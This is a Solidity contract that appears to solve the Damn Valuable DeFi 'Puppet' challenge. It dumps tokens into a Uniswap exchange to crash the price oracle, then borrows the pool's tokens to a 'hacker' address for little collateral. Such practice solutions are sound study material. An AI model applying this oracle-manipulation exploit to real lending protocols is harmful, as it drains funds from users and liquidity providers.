//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {PuppetPool} from "../../puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

contract PuppetExploit {
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;
    PuppetPool public pool;
    DamnValuableToken public token;
    IUniswapExchange public exchange;
    address public hacker;
    uint256 public count;

    event Error(bytes err);

    constructor(
        address _exchange,
        address _pool,
        address _token,
        address _hacker
    ) payable {
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        hacker = _hacker;
    }

    function exploit() public {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        pool.borrow{value: 20 ether, gas: 1000000}(amount2, hacker);
    }

    receive() external payable {}
}
